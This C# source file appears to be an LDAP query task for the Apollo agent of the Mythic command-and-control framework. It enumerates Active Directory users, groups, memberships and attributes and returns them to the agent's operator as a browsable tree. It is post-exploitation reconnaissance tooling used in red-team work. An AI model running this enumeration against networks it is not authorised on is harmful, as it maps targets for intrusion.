#define COMMAND_NAME_UPPER

#if DEBUG
#define LDAP_QUERY
#endif

#if LDAP_QUERY

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Xml;

namespace Tasks
{
    public class ActiveDirectoryLdapQuery
    {
        private readonly string _ldapPath;
        private readonly string _username;
        private readonly string _password;
        private readonly bool _chaseReferrals;

        /// <summary>
        /// Initializes a new instance with default credentials (current user)
        /// </summary>
        /// <param name="ldapPath">LDAP path (e.g., "LDAP://DC=domain,DC=com")</param>
        public ActiveDirectoryLdapQuery(string ldapPath)
        {
            _ldapPath = ldapPath;
            _chaseReferrals = true;
        }

        /// <summary>
        /// Initializes a new instance with specific credentials
        /// </summary>
        /// <param name="ldapPath">LDAP path (e.g., "LDAP://DC=domain,DC=com")</param>
        /// <param name="username">Username for authentication</param>
        /// <param name="password">Password for authentication</param>
        public ActiveDirectoryLdapQuery(string ldapPath, string username, string password)
        {
            _ldapPath = ldapPath;
            _username = username;
            _password = password;
            _chaseReferrals = true;
        }

        /// <summary>
        /// Queries Active Directory and returns results as a list of dictionaries
        /// </summary>
        /// <param name="filter">LDAP search filter (e.g., "(objectClass=user)")</param>
        /// <param name="searchBase">Optional search base (null to use root)</param>
        /// <param name="attributesToReturn">Optional list of attributes to return (null for all)</param>
        /// <param name="searchScope">Search scope (default: Subtree)</param>
        /// <returns>List of dictionaries containing the results</returns>
        public List<Dictionary<string, object>> Query(
            string filter,
            string searchBase = null,
            string[] attributesToReturn = null,
            int limit = 0,
            SearchScope searchScope = SearchScope.Subtree)
        {
            var results = new List<Dictionary<string, object>>();

            using (var directoryEntry = CreateDirectoryEntry(searchBase))
            using (var searcher = new DirectorySearcher(directoryEntry))
            {
                searcher.Filter = filter;
                searcher.SearchScope = searchScope;

                // Add attributes to load if specified
                if (attributesToReturn != null && attributesToReturn.Length > 0)
                {
                    searcher.PropertiesToLoad.AddRange(attributesToReturn);
                }

                searcher.CacheResults = false;
                searcher.SizeLimit = limit;
                searcher.PageSize = limit;
                // Configure referral chasing
                if (_chaseReferrals)
                {
                    searcher.ReferralChasing = ReferralChasingOption.All;
                }
                else
                {
                    searcher.ReferralChasing = ReferralChasingOption.None;
                }
                using (var searchResults = searcher.FindAll())
                {
                    foreach (SearchResult searchResult in searchResults)
                    {
                        var entry = ExtractEntry(searchResult, attributesToReturn);
                        results.Add(entry);
                    }
                }
            }

            return results;
        }

        /// <summary>
        /// Creates a DirectoryEntry object with appropriate credentials
        /// </summary>
        private DirectoryEntry CreateDirectoryEntry(string searchBase)
        {
            string path = string.IsNullOrEmpty(searchBase)
                ? _ldapPath
                : $"{_ldapPath}/{searchBase}";

            if (string.IsNullOrEmpty(_username))
            {
                return new DirectoryEntry(path);
            }
            else
            {
                return new DirectoryEntry(path, _username, _password);
            }
        }

        /// <summary>
        /// Extracts properties from a SearchResult into a dictionary
        /// </summary>
        private Dictionary<string, object> ExtractEntry(
            SearchResult searchResult,
            string[] attributesToReturn)
        {
            var entry = new Dictionary<string, object>();

            // Add the distinguished name
            entry["DistinguishedName"] = searchResult.Path;

            // Determine which properties to extract
            var propertiesToExtract = attributesToReturn != null && attributesToReturn.Length > 0
                ? searchResult.Properties.PropertyNames.Cast<string>()
                    .Where(p => attributesToReturn.Contains(p, StringComparer.OrdinalIgnoreCase))
                : searchResult.Properties.PropertyNames.Cast<string>();

            foreach (string propertyName in propertiesToExtract)
            {
                var propertyCollection = searchResult.Properties[propertyName];

                if (propertyCollection == null || propertyCollection.Count == 0)
                {
                    entry[propertyName] = null;
                }
                else if (propertyCollection.Count == 1)
                {
                    // Single value - extract as single object
                    entry[propertyName] = ConvertValue(propertyCollection[0]);
                }
                else
                {
                    // Multiple values - extract as array
                    var values = new List<string>();
                    foreach (var value in propertyCollection)
                    {
                        values.Add($"{ConvertValue(value)}");
                    }
                    entry[propertyName] = values;
                }
            }

            return entry;
        }
        /// <summary>
        /// Checks if a byte array is a SID based on its structure
        /// </summary>
        private bool IsSid(byte[] bytes)
        {
            // SID minimum length is 8 bytes
            // Format: Revision(1) + SubAuthorityCount(1) + Authority(6) + SubAuthorities(variable)
            if (bytes == null || bytes.Length < 8)
                return false;

            // Check revision (should be 1)
            byte revision = bytes[0];
            if (revision != 1)
                return false;

            // Check sub-authority count
            byte subAuthorityCount = bytes[1];

            // Calculate expected length: 8 bytes header + (4 bytes * subAuthorityCount)
            int expectedLength = 8 + (subAuthorityCount * 4);

            return bytes.Length == expectedLength;
        }

        /// <summary>
        /// Converts a SID byte array to standard string format (S-1-5-21-...)
        /// </summary>
        private string ConvertSidToString(byte[] sid)
        {
            try
            {
                // SID structure:
                // byte 0: Revision (always 1)
                // byte 1: SubAuthorityCount
                // bytes 2-7: Authority (48-bit big-endian)
                // bytes 8+: SubAuthorities (32-bit little-endian each)

                byte revision = sid[0];
                byte subAuthorityCount = sid[1];

                // Parse the 48-bit authority (big-endian)
                long authority = 0;
                for (int i = 2; i <= 7; i++)
                {
                    authority = (authority << 8) | sid[i];
                }

                // Start building the SID string
                StringBuilder sidString = new StringBuilder();
                sidString.AppendFormat("S-{0}-{1}", revision, authority);

                // Parse each 32-bit sub-authority (little-endian)
                for (int i = 0; i < subAuthorityCount; i++)
                {
                    int offset = 8 + (i * 4);
                    uint subAuthority = BitConverter.ToUInt32(sid, offset);
                    sidString.AppendFormat("-{0}", subAuthority);
                }

                return sidString.ToString();
            }
            catch
            {
                // If conversion fails, fall back to base64
                return Convert.ToBase64String(sid);
            }
        }
        /// <summary>
        /// Converts AD property values to JSON-serializable types
        /// </summary>
        private object ConvertValue(object value)
        {
            if (value == null)
                return null;

            // Handle byte arrays (like objectGUID, objectSid)
            if (value is byte[] byteArray)
            {
                if (IsSid(byteArray))
                {
                    return ConvertSidToString(byteArray);
                }
                // Try to convert to GUID if it's 16 bytes
                if (byteArray.Length == 16)
                {
                    try
                    {
                        return new Guid(byteArray).ToString();
                    }
                    catch
                    {
                        // If not a valid GUID, return as base64
                        return Convert.ToBase64String(byteArray);
                    }
                }
                // Otherwise return as base64
                return Convert.ToBase64String(byteArray);
            }

            // Handle DateTime
            if (value is DateTime dateTime)
            {
                return dateTime.ToString("o"); // ISO 8601 format
            }

            // Return as-is for strings, numbers, etc.
            return value;
        }
    }
    public class ldap_query : Tasking
    {
        [DataContract]
        internal struct LdapQueryParameters
        {
            [DataMember(Name = "base")]
            public string Base;
            [DataMember(Name = "query")]
            public string query;
            [DataMember(Name ="attributes")]
            public string[] attributes;
            [DataMember(Name = "limit")]
            public int limit;
            [DataMember(Name = "scope")]
            public string scope;
        }
        public ldap_query(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }

        string[] groupClasses = { "group", "domain", "domainDNS", "organizationalUnit", "container", "builtinDomain" };

        private static string NormalizeLdapDn(string dn)
        {
            if (string.IsNullOrEmpty(dn))
            {
                return dn;
            }
            if (dn.StartsWith("LDAP://", StringComparison.OrdinalIgnoreCase))
            {
                dn = dn.Substring(7);
            }
            return string.Join(",", dn.Split(',')
                .Select(piece => piece.Trim())
                .Where(piece => piece != "")
                .Select(piece =>
                {
                    int equalsIndex = piece.IndexOf('=');
                    if (equalsIndex <= 0)
                    {
                        return piece;
                    }
                    string attribute = piece.Substring(0, equalsIndex).Trim();
                    string value = piece.Substring(equalsIndex + 1).Trim();
                    return string.Equals(attribute, "DC", StringComparison.OrdinalIgnoreCase)
                        ? $"DC={value.ToUpperInvariant()}"
                        : piece;
                }));
        }

        private static string NormalizeMetadataString(string value)
        {
            if (string.IsNullOrEmpty(value))
            {
                return value;
            }
            string candidate = value.StartsWith("LDAP://", StringComparison.OrdinalIgnoreCase)
                ? value.Substring(7)
                : value;
            string[] pieces = candidate.Split(',')
                .Select(piece => piece.Trim())
                .Where(piece => piece != "")
                .ToArray();
            return pieces.Length > 1 && pieces.All(piece => piece.Contains("="))
                ? NormalizeLdapDn(value)
                : value;
        }

        public override void Start()
        {
            MythicTaskResponse resp;
            LdapQueryParameters parameters = _jsonSerializer.Deserialize<LdapQueryParameters>(_data.Parameters);
            List<IMythicMessage> artifacts = new List<IMythicMessage>();
            string error = "";
            CustomBrowser customBrowser = new CustomBrowser();
            customBrowser.BrowserName = "ldap_browser";
            customBrowser.Host = parameters.Base;
            customBrowser.SetAsUserOutput = true;
            //customBrowser.UpdateDeleted = true;
            customBrowser.Entries = new List<CustomBrowserEntry>();
            string ldapBase = NormalizeLdapDn(parameters.Base);
            ActiveDirectoryLdapQuery query;
            if (!string.IsNullOrEmpty(ldapBase))
            {
                query = new ActiveDirectoryLdapQuery($"LDAP://{ldapBase}");
                string[] domainPieces = ldapBase.Split(',')
                    .Where(x => x.Trim().StartsWith("DC=", StringComparison.OrdinalIgnoreCase))
                    .ToArray();
                customBrowser.Host = domainPieces.Length > 0 ? string.Join(",", domainPieces) : ldapBase;
            } else
            {
                Domain domain = Domain.GetCurrentDomain();
                DirectoryEntry ent = domain.GetDirectoryEntry();
                string path = ent.Path;
                string[] pathPieces = ent.Path.Split('/');
                string domainDn = NormalizeLdapDn(pathPieces[pathPieces.Length - 1]);
                query = new ActiveDirectoryLdapQuery($"LDAP://{domainDn}");
                customBrowser.Host = domainDn;
            }

            List<Dictionary<string, object>> results = new List<Dictionary<string, object>>();
            string filter = parameters.query;
            if(filter == "")
            {
                filter = "(&(objectclass=top)(objectclass=container))";
            }
            SearchScope searchScope = SearchScope.Subtree;
            if (string.Equals(parameters.scope, "onelevel", StringComparison.OrdinalIgnoreCase))
            {
                searchScope = SearchScope.OneLevel;
            }
            else if (string.Equals(parameters.scope, "base", StringComparison.OrdinalIgnoreCase))
            {
                searchScope = SearchScope.Base;
            }
            try
            {
                if (searchScope == SearchScope.OneLevel && !string.IsNullOrEmpty(ldapBase))
                {
                    string[] baseAttributes = (parameters.attributes ?? new string[0])
                        .Concat(new[] { "cn", "samaccountname", "description", "member", "memberOf", "objectclass", "distinguishedname" })
                        .Distinct(StringComparer.OrdinalIgnoreCase)
                        .ToArray();
                    List<Dictionary<string, object>> baseResults = query.Query(
                        filter: "(objectClass=*)",
                        attributesToReturn: baseAttributes,
                        limit: 1,
                        searchScope: SearchScope.Base
                    );
                    bool baseIsGroup = false;
                    bool baseCanHaveChildren = false;
                    if (baseResults.Count > 0 && baseResults[0].TryGetValue("objectclass", out object baseObjectClass) && baseObjectClass != null)
                    {
                        IEnumerable<string> baseClasses = baseObjectClass is IEnumerable<string> baseValues
                            ? baseValues
                            : new[] { baseObjectClass.ToString() };
                        baseIsGroup = baseClasses.Any(x => string.Equals(x, "group", StringComparison.OrdinalIgnoreCase));
                        baseCanHaveChildren = baseClasses.Intersect(groupClasses, StringComparer.OrdinalIgnoreCase).Any();
                    }
                    if (baseIsGroup || !baseCanHaveChildren)
                    {
                        results = baseResults;
                    }
                    else
                    {
                        results = query.Query(
                            filter: filter,
                            attributesToReturn: parameters.attributes,
                            limit: parameters.limit,
                            searchScope: searchScope
                        );
                    }
                }
                else
                {
                    results = query.Query(
                        filter: filter,
                        attributesToReturn: parameters.attributes,
                        limit: parameters.limit,
                        searchScope: searchScope
                    );
                }
            }catch (Exception ex)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                ex.Message, true, "error"));
                return;
            }
            foreach (var user in results)
            {

                CustomBrowserEntry customBrowserEntry = new CustomBrowserEntry();
                if(user.TryGetValue("DistinguishedName", out object dn))
                {
                    string dnString = NormalizeLdapDn(dn.ToString());
                    customBrowserEntry.DisplayPath = dnString;
                    string[] dnStringPieces = dnString.Split(',');
                    customBrowserEntry.Name = dnStringPieces[0];
                    dnStringPieces = dnStringPieces.Skip(1).Take(dnStringPieces.Length-1).Reverse().ToArray();
                    customBrowserEntry.ParentPath = string.Join(",", dnStringPieces);
                    customBrowserEntry.Metadata = user.ToDictionary(
                        item => item.Key,
                        item => item.Value is IEnumerable<string> values
                            ? (object)string.Join(" | ", values.Select(NormalizeMetadataString))
                            : item.Value is string value
                                ? (object)NormalizeMetadataString(value)
                                : item.Value);
                    bool isGroup = false;
                    if(user.TryGetValue("objectclass", out object oc) && oc != null)
                    {
                        IEnumerable<string> classes = oc is IEnumerable<string> values
                            ? values
                            : new[] { oc.ToString() };

                        isGroup = classes.Any(x => string.Equals(x, "group", StringComparison.OrdinalIgnoreCase));
                        if (classes.Intersect(groupClasses, StringComparer.OrdinalIgnoreCase).Any())
                        {
                            customBrowserEntry.CanHaveChildren = true;
                        }

                    }
                    List<string> members = new List<string>();
                    if (user.TryGetValue("member", out object memberValue) && memberValue != null)
                    {
                        if (memberValue is IEnumerable<string> memberValues)
                        {
                            members = memberValues.Select(NormalizeLdapDn).ToList();
                        }
                        else
                        {
                            members.Add(NormalizeLdapDn(memberValue.ToString()));
                        }
                    }
                    if (isGroup && members.Count > 0)
                    {
                        customBrowserEntry.Children = members.Select(memberDn => new CustomBrowserEntryChild
                        {
                            Name = memberDn.Split(',')[0],
                            DisplayPath = memberDn,
                            CanHaveChildren = true,
                            Metadata = new Dictionary<string, object>
                            {
                                { "distinguishedname", memberDn },
                                { "name", memberDn.Split(',')[0] }
                            }
                        }).ToList();
                    }
                    customBrowser.Entries.Add(customBrowserEntry);
                }

               // Console.WriteLine(_jsonSerializer.Serialize(user));
            }
            // Console.WriteLine(_jsonSerializer.Serialize(results));

            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                "", true, "completed", new IMythicMessage[]
                {
                    customBrowser
                }));

        }
    }
}

#endif
